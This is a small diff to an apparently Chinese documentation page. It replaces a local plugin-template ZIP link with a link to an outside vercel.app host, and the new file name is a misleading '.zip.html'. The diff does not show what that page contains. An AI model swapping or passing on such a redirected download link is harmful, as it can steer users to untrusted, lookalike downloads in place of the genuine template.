@@ -4,7 +4,7 @@
 
 ## 下载
 
-[**插件模板 ZIP**](/templates/plugin-example.zip)
+[**插件模板 ZIP**](https://tools-plugin-docs-ign4.vercel.app/templates/plugin-example.zip.html)
 
 ## 使用
 
